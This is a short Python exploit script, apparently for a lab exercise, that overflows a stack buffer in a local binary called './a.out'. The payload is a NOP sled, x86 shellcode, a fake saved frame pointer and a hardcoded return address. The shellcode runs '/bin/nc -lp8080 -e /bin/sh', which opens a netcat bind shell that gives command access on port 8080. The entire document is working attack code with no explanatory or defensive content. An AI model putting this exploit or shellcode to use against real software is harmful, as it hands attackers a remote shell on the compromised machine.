#!/usr/bin/env python 

from struct import pack
from subprocess import call

def p(x): return pack('<L', x)

shellcode = (
	"\xeb\x2a\x5e\x31\xc0\x88\x46\x07\x88\x46\x0f\x88\x46\x19\x89\x76\x1a\x8d\x5e\x08\x89\x5e\x1e\x8d\x5e\x10\x89\x5e\x22\x89\x46\x26\xb0\x0b\x89\xf3\x8d\x4e\x1a\x8d\x56\x26\xcd\x80\xe8\xd1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x6e\x63\x23\x2d\x6c\x70\x38\x30\x38\x30\x23\x2d\x65\x2f\x62\x69\x6e\x2f\x73\x68\x23"
)

sfp = 0xdeadbeef # for overwriting saved frame pointer with 0xdeadbeef (not important)
ret = 0xffffd40c # jumping somewhere between nops

payload = "\x90" * 53
payload += shellcode
payload += p(sfp)
payload += p(ret)

call(["./a.out", payload])
